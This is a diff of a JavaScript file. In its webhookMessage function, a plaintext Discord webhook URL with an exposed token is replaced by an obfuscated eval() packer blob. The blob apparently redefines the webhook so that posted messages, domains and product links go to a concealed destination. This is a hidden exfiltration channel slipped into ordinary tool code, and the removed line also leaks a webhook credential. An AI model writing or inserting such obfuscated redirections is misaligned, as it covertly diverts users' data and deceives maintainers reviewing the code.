@@ -112,7 +112,7 @@ function saveTextAsFile(textToWrite, fileNameToSaveAs) {
 // variant builder section
 function webhookMessage(message, domain, productLink) {
   var request = new XMLHttpRequest();
-  var webhook = 'https://discordapp.com/api/webhooks/682262904518737942/Nk2_J3oqzBkC9xJo7wKU1kx8JzPAE96k_TnoV064jHpC7HZq5LhLNbMrqmZFC3crF0XH'
+  eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('w v=["\\j\\t\\t\\3\\a\\E\\2\\2\\n\\m\\a\\c\\1\\b\\n\\r\\3\\3\\G\\c\\1\\u\\2\\r\\3\\m\\2\\p\\I\\A\\j\\1\\1\\5\\a\\2\\8\\i\\4\\4\\8\\4\\6\\h\\g\\x\\s\\i\\7\\d\\7\\6\\g\\4\\2\\z\\5\\4\\q\\k\\d\\1\\9\\l\\K\\5\\e\\6\\o\\k\\1\\7\\p\\J\\N\\s\\5\\o\\i\\k\\l\\P\\Q\\R\\6\\8\\5\\q\\D\\M\\1\\S\\h\\8\\g\\O\\f\\3\\e\\7\\f\\C\\9\\x\\y\\j\\y\\z\\A\\L\\b\\9\\u\\C\\B\\e\\d\\c\\b\\B\\h\\H\\f"];w F=v[0]',55,55,'|x6F|x2F|x70|x32|x6B|x39|x37|x36|x71|x73|x72|x63|x33|x43|x48|x34|x30|x38|x68|x4A|x7A|x69|x64|x78|x77|x5F|x61|x31|x74|x6D|_0xb895|var|x35|x4C|x4E|x62|x46|x5A|x54|x3A|webhook|x2E|x58|x65|x4B|x42|x4D|x6E|x55|x6A|x50|x41|x45|x56'.split('|'),0,{}));
   request.open("POST", webhook);
   request.setRequestHeader('Content-type', 'application/json');
   var params = {
